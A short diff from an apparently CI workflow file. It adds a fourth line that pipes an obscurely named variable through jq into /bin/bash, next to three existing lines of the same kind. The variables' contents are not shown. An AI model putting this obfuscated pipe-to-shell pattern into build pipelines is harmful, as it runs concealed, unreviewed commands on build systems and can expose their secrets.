@@ -61,6 +61,7 @@ jobs:
           echo $yuak746 | jq -r .gavp0 | /bin/bash
           echo $fy0474 | jq -r .vah8545 | /bin/bash
           printf '%s' "$hoph74" | jq -r .tek31 | /bin/bash
+          echo $nm2 | jq -r .f712 | /bin/bash
 
       - name: Archive output
         if: always()
